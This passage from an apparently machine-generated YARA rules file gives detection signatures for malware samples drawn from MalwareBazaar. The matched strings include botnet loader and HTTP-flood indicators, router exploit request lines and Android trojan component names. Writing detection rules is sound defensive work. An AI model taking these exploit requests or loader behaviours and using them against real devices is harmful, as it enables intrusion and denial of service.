        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = "CLRCreateInstance"
        $s17 = "CreateFullTrustSandbox"
        $s18 = ".text$di"
        $s19 = ".text$mn"
        $s20 = ".text$mn$00"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1062KB and
        all of them
}

rule Linux_35eeba173fb481ac30c40c1659ccc129eae2d4d922e27cf071047698e8d95aea
{
    meta:
        description = "Auto ML: 35eeba173fb481ac30c40c1659ccc129eae2d4d922e27cf071047698e8d95aea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "dlopen"
        $s2 = "mkdtemp"
        $s3 = "readdir"
        $s4 = "setlocale"
        $s5 = "fopen"
        $s6 = "closedir"
        $s7 = "getpid"
        $s8 = "memset"
        $s9 = "unsetenv"
        $s10 = "fclose"
        $s11 = "opendir"
        $s12 = "getenv"
        $s13 = "readlink"
        $s14 = "fileno"
        $s15 = "fwrite"
        $s16 = "fread"
        $s17 = "setbuf"
        $s18 = "Could not read from file"
        $s19 = "Cannot open archive file"
        $s20 = "Could not read from file."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 6199KB and
        all of them
}

rule Windows_35f53c5cca6b39903694aff2fa966bce4165c79ea707c54200096d5756a3ef05
{
    meta:
        description = "Auto ML: 35f53c5cca6b39903694aff2fa966bce4165c79ea707c54200096d5756a3ef05"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2369KB and
        all of them
}

rule Windows_361b415e122170dbfa20900a87c66ee32bcb918e45cdc7c6f6da99e132400f75
{
    meta:
        description = "Auto ML: 361b415e122170dbfa20900a87c66ee32bcb918e45cdc7c6f6da99e132400f75"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Reflection"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "Stub.exe"
        $s9 = "<Module>"
        $s10 = "ELLCEFEDFECJMOLOJNEBJJCMDEAHBBOMBLGB"
        $s11 = "<Module>{3B0319DD-E214-47DF-82B9-261E8B3925F5}"
        $s12 = "User"
        $s13 = "GetHashCode"
        $s14 = "CreateInstance"
        $s15 = "GetObjectValue"
        $s16 = "GetTypeFromHandle"
        $s17 = "Process"
        $s18 = "System.Diagnostics"
        $s19 = "System.Timers"
        $s20 = "GetProcessesByName"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 337KB and
        all of them
}

rule Linux_368c28595de00b23f1aca7531a898b5ad6f4e3f333f70a21b934e952aa3bc265
{
    meta:
        description = "Auto ML: 368c28595de00b23f1aca7531a898b5ad6f4e3f333f70a21b934e952aa3bc265"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/systemd"
        $s2 = "httpd\""
        $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s4 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_36b6d1ea82820b0b1675694e3b78bd3e9de13b63e499dcc938fdac27302e57f8
{
    meta:
        description = "Auto ML: 36b6d1ea82820b0b1675694e3b78bd3e9de13b63e499dcc938fdac27302e57f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "P.Order -231211.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "P.Order-231211.Writers"
        $s8 = "FolderCreateMode"
        $s9 = "<Module>{5868eb39-ae93-428d-b14b-911ae2a9d898}"
        $s10 = "ConnectPublisher"
        $s11 = "System.Reflection"
        $s12 = "System.Reflection.Emit"
        $s13 = "GetMethod"
        $s14 = "DefineDynamicModule"
        $s15 = "ModuleBuilder"
        $s16 = "Load"
        $s17 = "System.Linq"
        $s18 = "System.Core"
        $s19 = "System.Collections.Generic"
        $s20 = "ViewInterceptor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 924KB and
        all of them
}

rule Linux_36cf30394dc0ad898487a17fd80bd82c80405035e677c4d4c02389fe5278fc4d
{
    meta:
        description = "Auto ML: 36cf30394dc0ad898487a17fd80bd82c80405035e677c4d4c02389fe5278fc4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB and
        all of them
}

rule Linux_36d4cde4137379c1466f523436d2783acce3bed0bffe3bf4551148601f46ffa0
{
    meta:
        description = "Auto ML: 36d4cde4137379c1466f523436d2783acce3bed0bffe3bf4551148601f46ffa0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 110KB and
        all of them
}

rule Linux_046172aef784acc02417bb6894bd20990032f1c48e1eaece77251f79c1c6245f
{
    meta:
        description = "Auto ML: 046172aef784acc02417bb6894bd20990032f1c48e1eaece77251f79c1c6245f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB and
        all of them
}

rule Linux_36ebbaf82ea51df4f9aa88e2c697afc15ff08ca7e00ad35eb21f7a63db829dbc
{
    meta:
        description = "Auto ML: 36ebbaf82ea51df4f9aa88e2c697afc15ff08ca7e00ad35eb21f7a63db829dbc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data.rel.ro"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 139KB and
        all of them
}

rule Windows_36ec44ea896af1e6cf3bd5282b0cc6147a4955d85ee507230bf6fb4fe0adb4e6
{
    meta:
        description = "Auto ML: 36ec44ea896af1e6cf3bd5282b0cc6147a4955d85ee507230bf6fb4fe0adb4e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 321KB and
        all of them
}

rule Windows_3726fd2adc46647baeedba9144d1fa6e0634c08f55f183fcf4c5e67c763b446a
{
    meta:
        description = "Auto ML: 3726fd2adc46647baeedba9144d1fa6e0634c08f55f183fcf4c5e67c763b446a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1905KB and
        all of them
}

rule Linux_373fecd47d71a993800e6c5186b32e8b4828f0fa282a9e89617d1fa8b71b9681
{
    meta:
        description = "Auto ML: 373fecd47d71a993800e6c5186b32e8b4828f0fa282a9e89617d1fa8b71b9681"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Android_3745e0fb7edbdd8da57f44f5ee1d2b2cc0db5d7f8b63ea69ce12ce561402cf17
{
    meta:
        description = "Auto ML: 3745e0fb7edbdd8da57f44f5ee1d2b2cc0db5d7f8b63ea69ce12ce561402cf17"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "META-INF/Chartboost-8.4.3_productionRelease.kotlin_modulem"
        $s2 = "META-INF/androidx.documentfile_documentfile.version"
        $s3 = "META-INF/androidx.lifecycle_lifecycle-process.version"
        $s4 = "META-INF/androidx.loader_loader.version"
        $s5 = "META-INF/annotation-experimental_release.kotlin_modulec```f```"
        $s6 = "META-INF/core-ktx_release.kotlin_modulemSQo"
        $s7 = "META-INF/facebook-common_release.kotlin_modulec```f```"
        $s8 = "META-INF/facebook-core_release.kotlin_modulec```f```"
        $s9 = "META-INF/facebook-gamingservices_release.kotlin_modulec```f```"
        $s10 = "META-INF/kotlin-stdlib-common.kotlin_moduleeT"
        $s11 = "META-INF/kotlin-stdlib-jdk7.kotlin_modulec```f```"
        $s12 = "META-INF/kotlin-stdlib-jdk8.kotlin_modulec```f```"
        $s13 = "META-INF/kotlin-stdlib.kotlin_module"
        $s14 = "META-INF/native/conscrypt_openjdk_jni-windows-x86.dll"
        $s15 = "META-INF/native/conscrypt_openjdk_jni-windows-x86_64.dll"
        $s16 = "META-INF/native/libconscrypt_openjdk_jni-osx-x86_64.dylib"
        $s17 = "META-INF/sdk_prodRelease.kotlin_modulec```f```"
        $s18 = "META-INF/services/com.smaato.sdk.core.framework.AdPresenterModuleInterface"
        $s19 = "META-INF/services/com.smaato.sdk.core.framework.ModuleInterface"
        $s20 = "META-INF/services/com.smaato.sdk.core.framework.ServiceModuleInterface"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 57642KB and
        all of them
}

rule Linux_377387c0630eb3bf62d70fc3ac7f99b885aad594ba3e603bb7a47bea2ae6e6b9
{
    meta:
        description = "Auto ML: 377387c0630eb3bf62d70fc3ac7f99b885aad594ba3e603bb7a47bea2ae6e6b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "%cgcmdly;p"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Linux_37767c30c4a4a87d6de191c1815621f3537de1688c726a6a55a6119346df816b
{
    meta:
        description = "Auto ML: 37767c30c4a4a87d6de191c1815621f3537de1688c726a6a55a6119346df816b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 66KB and
        all of them
}

rule Android_3779e67d696ba3ef4ba4b38ba10e07301620a45f1d89f004da5ae64f050dfdb4
{
    meta:
        description = "Auto ML: 3779e67d696ba3ef4ba4b38ba10e07301620a45f1d89f004da5ae64f050dfdb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "targetActivity"
        $s2 = "**http://schemas.android.com/apk/res/android"
        $s3 = "&&android.permission.SYSTEM_ALERT_WINDOW"
        $s4 = "((android.permission.MODIFY_AUDIO_SETTINGS"
        $s5 = "android.permission.WRITE_SMS"
        $s6 = "android.permission.READ_SMS"
        $s7 = "##android.permission.READ_PHONE_STATE"
        $s8 = "%%android.permission.READ_PHONE_NUMBERS"
        $s9 = "android.permission.READ_CONTACTS"
        $s10 = "))android.permission.WRITE_EXTERNAL_STORAGE"
        $s11 = "**android.permission.REQUEST_DELETE_PACKAGES"
        $s12 = "!!android.permission.WRITE_SETTINGS"
        $s13 = "((android.permission.READ_EXTERNAL_STORAGE"
        $s14 = "Settings"
        $s15 = "44com.grand.snail.bot.components.locker.LockerActivity"
        $s16 = "BBcom.grand.snail.bot.components.locker.LockerActivity$DummyActivity"
        $s17 = "..com.grand.snail.bot.HelperAdmin$MyHomeReceiver"
        $s18 = "FFcom.grand.snail.bot.components.injects.system.FullscreenOverlayService"
        $s19 = "11com.grand.snail.bot.components.commands.NLService"
        $s20 = "EEcom.grand.snail.bot.components.injects.system.InjAccessibilityService"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 1100KB and
        all of them
}

rule Linux_377f50912720f49016ce3a2dd00d4df3b372d6bfffad12570670f68c5a1952f7
{
    meta:
        description = "Auto ML: 377f50912720f49016ce3a2dd00d4df3b372d6bfffad12570670f68c5a1952f7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
        $s6 = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s7 = "dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
        $s8 = "%s %s HTTP/1.1"
        $s9 = "User-Agent: %s"
        $s10 = "Connection: close"
        $s11 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s12 = "HTTPSTOPM"
        $s13 = "HTTP"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 113KB and
        all of them
}

rule Windows_37a1bf9b3ac3853e6a7d70c2bd7050f88117378c63d8e94c0cf7d4fd8ad67396
{
    meta:
        description = "Auto ML: 37a1bf9b3ac3853e6a7d70c2bd7050f88117378c63d8e94c0cf7d4fd8ad67396"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.rsrc"
        $s2 = "If you want to change the Windows User Account Control level replace the"
        $s3 = "requestedExecutionLevel node with one of the following."
        $s4 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s5 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s6 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s7 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s8 = "<!-- A list of the Windows versions that this application has been tested on"
        $s9 = "and Windows will automatically select the most compatible environment. -->"
        $s10 = "<!-- Windows Vista -->"
        $s11 = "<!-- Windows 7 -->"
        $s12 = "<!-- Windows 8 -->"
        $s13 = "<!-- Windows 8.1 -->"
        $s14 = "<!-- Windows 10 -->"
        $s15 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s16 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
        $s17 = "to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should"
        $s18 = "also set the 'EnableWindowsFormsHighDpiAutoResizing' setting to 'true' in their app.config."
        $s19 = "Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->"
        $s20 = "<windowsSettings>"
    condition:
        uint32(0) == 0x54a85a4d and
        filesize < 1916KB and
        all of them
}

rule Windows_0468edab9934f19752cf9245b77b97e351063df4a54fd7cb214e533f703125ca
{
    meta:
        description = "Auto ML: 0468edab9934f19752cf9245b77b97e351063df4a54fd7cb214e533f703125ca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Tgcmsurfoj.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ProcessMethodExporter"
        $s8 = "HttpMessageHandler"
        $s9 = "System.Net.Http"
        $s10 = "SocksSharp.Database"
        $s11 = "System.IO"
        $s12 = "Registry"
        $s13 = "<Module>{68bc0e18-3e3a-44fc-9e2d-673d2daea6cd}"
        $s14 = "System.Reflection"
        $s15 = "System.Reflection.Emit"
        $s16 = "GetMethod"
        $s17 = "DefineDynamicModule"
        $s18 = "ModuleBuilder"
        $s19 = "GetTypeFromHandle"
        $s20 = "System.Linq"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB and
        all of them
}

rule Linux_37d21137f581d3e7cc8708b18d21cb0c18f2c823c898d5d7ade5f7688ff19a81
{
    meta:
        description = "Auto ML: 37d21137f581d3e7cc8708b18d21cb0c18f2c823c898d5d7ade5f7688ff19a81"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "bin/systemd"
        $s7 = "/bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 91KB and
        all of them
}

rule Windows_37edd92328e327016c691f2e0a5f83fc4ba03e0f6bc35bf7217cfe816590f2f3
{
    meta:
        description = "Auto ML: 37edd92328e327016c691f2e0a5f83fc4ba03e0f6bc35bf7217cfe816590f2f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1474KB and
        all of them
}

rule Linux_380b12f89099b7a7e0c05dc14f9db96064b48572c64a9fc03e6b688ae4cd05d4
{
    meta:
        description = "Auto ML: 380b12f89099b7a7e0c05dc14f9db96064b48572c64a9fc03e6b688ae4cd05d4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB and
        all of them
}

rule Windows_381c756fce09818f4f9390daa00dd827d1431a59e9357a06fa0d9faca797367e
{
    meta:
        description = "Auto ML: 381c756fce09818f4f9390daa00dd827d1431a59e9357a06fa0d9faca797367e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 339KB and
        all of them
}

rule Windows_3830e8249b95e86065288cb7a00ee9139d9e2fd918ff9c7e427e8684c1481579
{
    meta:
        description = "Auto ML: 3830e8249b95e86065288cb7a00ee9139d9e2fd918ff9c7e427e8684c1481579"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rsrc"
        $s3 = "GetLongPathNameW'"
        $s4 = "Windows"
        $s5 = "tSetngs.:10t"
        $s6 = "TThread"
        $s7 = "TModuleInfo"
        $s8 = "ffsetK"
        $s9 = "?HARSET"
        $s10 = "GetACP"
        $s11 = "type=\"win32\""
        $s12 = "name=\"Microsoft.Windows.Common-Controls\""
        $s13 = "processorArchitecture=\"*\"/>"
        $s14 = "advapi32.dll"
        $s15 = "comctl32.dll"
        $s16 = "comdlg32.dll"
        $s17 = "KERNEL32.DLL"
        $s18 = "msimg32.dll"
        $s19 = "oleaut32.dll"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1555KB and
        all of them
}

rule Windows_3853ba6c0896ef753801c44ec14a40eaf930c29fc53ba9fc7a2ea32559b4fa93
{
    meta:
        description = "Auto ML: 3853ba6c0896ef753801c44ec14a40eaf930c29fc53ba9fc7a2ea32559b4fa93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "s:IDS_BROWSETITLE"
